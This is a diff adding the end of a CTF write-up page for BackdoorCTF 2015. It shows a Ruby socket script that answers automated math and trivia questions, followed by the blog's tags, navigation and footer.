+		<span class="n">answer</span> <span class="o">=</span> <span class="n">solve_fib</span><span class="p">(</span><span class="n">n</span><span class="p">).</span><span class="nf">to_i</span>
+		<span class="nb">p</span> <span class="s2">"answer:"</span><span class="o">+</span><span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">sock</span><span class="p">.</span><span class="nf">write</span> <span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span><span class="o">+</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+	<span class="k">elsif</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/the country of/</span><span class="p">)</span>
+		<span class="n">n</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/country of ([a-zA-Z,'\(\)\s]+)/</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">to_s</span>
+		<span class="nb">puts</span> <span class="s2">"city: "</span><span class="o">+</span><span class="n">n</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">answer</span> <span class="o">=</span> <span class="n">get_country</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
+		<span class="nb">p</span> <span class="s2">"answer:"</span><span class="o">+</span><span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">sock</span><span class="p">.</span><span class="nf">write</span> <span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span><span class="o">+</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+	<span class="k">elsif</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/sum of the first (\d+) natural numbers/</span><span class="p">)</span>
+		<span class="n">n</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/sum of the first (\d+) natural numbers/</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">to_i</span>
+		<span class="nb">puts</span> <span class="s2">"n: "</span><span class="o">+</span><span class="n">n</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">answer</span> <span class="o">=</span> <span class="n">sum_n</span><span class="p">(</span><span class="n">n</span><span class="p">).</span><span class="nf">to_i</span>
+		<span class="nb">p</span> <span class="s2">"answer:"</span><span class="o">+</span><span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">sock</span><span class="p">.</span><span class="nf">write</span> <span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span><span class="o">+</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+	<span class="k">elsif</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/sum of first (\d+) natural numbers/</span><span class="p">)</span>
+		<span class="n">n</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/sum of first (\d+) natural numbers/</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">to_i</span>
+		<span class="nb">puts</span> <span class="s2">"n: "</span><span class="o">+</span><span class="n">n</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">answer</span> <span class="o">=</span> <span class="n">sum_n</span><span class="p">(</span><span class="n">n</span><span class="p">).</span><span class="nf">to_i</span>
+		<span class="nb">p</span> <span class="s2">"answer:"</span><span class="o">+</span><span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">sock</span><span class="p">.</span><span class="nf">write</span> <span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span><span class="o">+</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+	<span class="k">elsif</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/the (\d+)th digit in pi/</span><span class="p">)</span>
+		<span class="n">n</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/the (\d+)th digit in pi/</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">to_i</span>
+		<span class="nb">puts</span> <span class="s2">"n: "</span><span class="o">+</span><span class="n">n</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">answer</span> <span class="o">=</span> <span class="n">get_pi</span><span class="p">(</span><span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">).</span><span class="nf">to_i</span>
+		<span class="nb">p</span> <span class="s2">"answer:"</span><span class="o">+</span><span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">sock</span><span class="p">.</span><span class="nf">write</span> <span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span><span class="o">+</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+	<span class="k">elsif</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/the (\d+)rd digit in pi/</span><span class="p">)</span>
+		<span class="n">n</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/the (\d+)rd digit in pi/</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">to_i</span>
+		<span class="nb">puts</span> <span class="s2">"n: "</span><span class="o">+</span><span class="n">n</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">answer</span> <span class="o">=</span> <span class="n">get_pi</span><span class="p">(</span><span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">).</span><span class="nf">to_i</span>
+		<span class="nb">p</span> <span class="s2">"answer:"</span><span class="o">+</span><span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">sock</span><span class="p">.</span><span class="nf">write</span> <span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span><span class="o">+</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+	<span class="k">elsif</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/the (\d+)nd digit in pi/</span><span class="p">)</span>
+		<span class="n">n</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/the (\d+)nd digit in pi/</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">to_i</span>
+		<span class="nb">puts</span> <span class="s2">"n: "</span><span class="o">+</span><span class="n">n</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">answer</span> <span class="o">=</span> <span class="n">get_pi</span><span class="p">(</span><span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">).</span><span class="nf">to_i</span>
+		<span class="nb">p</span> <span class="s2">"answer:"</span><span class="o">+</span><span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">sock</span><span class="p">.</span><span class="nf">write</span> <span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span><span class="o">+</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+	<span class="k">elsif</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/the (\d+)st digit in pi/</span><span class="p">)</span>
+		<span class="n">n</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/the (\d+)st digit in pi/</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">to_i</span>
+		<span class="nb">puts</span> <span class="s2">"n: "</span><span class="o">+</span><span class="n">n</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">answer</span> <span class="o">=</span> <span class="n">get_pi</span><span class="p">(</span><span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">).</span><span class="nf">to_i</span>
+		<span class="nb">p</span> <span class="s2">"answer:"</span><span class="o">+</span><span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">sock</span><span class="p">.</span><span class="nf">write</span> <span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span><span class="o">+</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+	<span class="k">elsif</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/md5 hash/</span><span class="p">)</span>
+		<span class="n">n</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/md5 hash of (\d+)/</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">to_i</span>
+		<span class="nb">puts</span> <span class="s2">"n: "</span><span class="o">+</span><span class="n">n</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">answer</span> <span class="o">=</span> <span class="n">cal_md5</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
+		<span class="nb">p</span> <span class="s2">"answer:"</span><span class="o">+</span><span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">sock</span><span class="p">.</span><span class="nf">write</span> <span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span><span class="o">+</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+	<span class="k">elsif</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/sum of first (\d+) natural odd numbers/</span><span class="p">)</span>
+		<span class="n">n</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/sum of first (\d+) natural odd numbers/</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">to_i</span>
+		<span class="nb">puts</span> <span class="s2">"n: "</span><span class="o">+</span><span class="n">n</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">answer</span> <span class="o">=</span> <span class="n">sum_odd</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
+		<span class="nb">p</span> <span class="s2">"answer:"</span><span class="o">+</span><span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">sock</span><span class="p">.</span><span class="nf">write</span> <span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span><span class="o">+</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+	<span class="k">elsif</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/sum of first (\d+) fibonacci numbers/</span><span class="p">)</span>
+		<span class="n">n</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/sum of first (\d+) fibonacci numbers/</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">to_i</span>
+		<span class="nb">puts</span> <span class="s2">"n: "</span><span class="o">+</span><span class="n">n</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">answer</span> <span class="o">=</span> <span class="n">solve_fib</span><span class="p">(</span><span class="n">n</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span>
+		<span class="nb">p</span> <span class="s2">"answer:"</span><span class="o">+</span><span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">sock</span><span class="p">.</span><span class="nf">write</span> <span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span><span class="o">+</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+	<span class="k">elsif</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/value of (\d+) in binary/</span><span class="p">)</span>
+		<span class="n">n</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/value of (\d+) in binary/</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">to_i</span>
+		<span class="nb">puts</span> <span class="s2">"n: "</span><span class="o">+</span><span class="n">n</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">answer</span> <span class="o">=</span> <span class="n">n</span><span class="p">.</span><span class="nf">to_s</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+		<span class="nb">p</span> <span class="s2">"answer:"</span><span class="o">+</span><span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">sock</span><span class="p">.</span><span class="nf">write</span> <span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span><span class="o">+</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+	<span class="k">elsif</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/the 2 digit code of/</span><span class="p">)</span>
+		<span class="n">n</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/the 2 digit code of ([a-zA-Z,'\(\)\s]+)/</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">to_s</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span>
+		<span class="nb">puts</span> <span class="s2">"n: "</span><span class="o">+</span><span class="n">n</span><span class="p">.</span><span class="nf">to_s</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span>
+		<span class="n">answer</span> <span class="o">=</span> <span class="n">code_db</span><span class="p">[</span><span class="n">n</span><span class="p">]</span>
+		<span class="nb">p</span> <span class="s2">"answer:"</span><span class="o">+</span><span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">sock</span><span class="p">.</span><span class="nf">write</span> <span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span><span class="o">+</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+	<span class="k">elsif</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/release year of/</span><span class="p">)</span>
+		<span class="n">n</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/release year of ([\S\s]+)/</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">to_s</span>
+		<span class="nb">puts</span> <span class="s2">"movie: "</span><span class="o">+</span><span class="n">n</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">answer</span> <span class="o">=</span> <span class="n">get_movie_year</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
+		<span class="nb">p</span> <span class="s2">"answer:"</span><span class="o">+</span><span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">sock</span><span class="p">.</span><span class="nf">write</span> <span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span><span class="o">+</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+	<span class="k">else</span> 
+	<span class="k">end</span>
+<span class="k">end</span>
+<span class="nb">puts</span> <span class="n">sock</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>	
+<span class="n">sock</span><span class="p">.</span><span class="nf">close</span>
+
+</code></pre></div></div>
+<p>500 points for solving this challenge! Woo-hoo!</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#backdoorctf" class="page__taxonomy-item" rel="tag">BackdoorCTF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#forensic" class="page__taxonomy-item" rel="tag">Forensic</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#misc" class="page__taxonomy-item" rel="tag">Misc</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ppc" class="page__taxonomy-item" rel="tag">PPC</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pwnable" class="page__taxonomy-item" rel="tag">Pwnable</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">Python</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ruby" class="page__taxonomy-item" rel="tag">ruby</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#write-ups" class="page__taxonomy-item" rel="tag">write-ups</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2015-05-08T01:11:00+08:00">May 08, 2015</time></p>
+        
+      </footer>
+
+      <!-- /usr/gem/gems/minimal-mistakes-jekyll-4.13.0/_includes/social-share.html -->
+<!-- Remove linkdin shared button -->
+<section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=BackdoorCTF+2015+--+Binary+%2B+Misc%20http%3A%2F%2F0.0.0.0%3A4000%2Fbackdoorctf-2015-binary-misc%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2Fbackdoorctf-2015-binary-misc%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://plus.google.com/share?url=http%3A%2F%2F0.0.0.0%3A4000%2Fbackdoorctf-2015-binary-misc%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>
+
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/0ctf-2015-quals-geo-newbie/" class="pagination--pager" title="0CTF 2015 Quals – geo-newbie
+">Previous</a>
+    
+    
+      <a href="/volgactf-2015-quals-math-problem/" class="pagination--pager" title="VolgaCTF 2015 Quals – math problem
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You May Also Enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" rel="permalink">Chakrazy – exploiting type confusion bug in ChakraCore engine
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" rel="permalink">Learning browser exploitation via 33C3 CTF  feuerfuchs challenge
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/hxp-CTF-2017-hardened-flag-store/" rel="permalink">hxp CTF 2017 – hardened_flag_store
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/MeePwn-CTF-2017-Brainfuck-1-2/" rel="permalink">MeePwn CTF 2017 – Brainfuck 1 &amp; 2
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+      </div>
+    </div>
+  
+</div>
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+    <div id="results" class="results"></div></div>
+      </div>
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2018 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://0.0.0.0:4000/backdoorctf-2015-binary-misc/";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.identifier = "/backdoorctf-2015-binary-misc"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+      var d = document, s = d.createElement('script');
+      s.src = 'https://bruce30262logdown.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+  </body>
+</html>
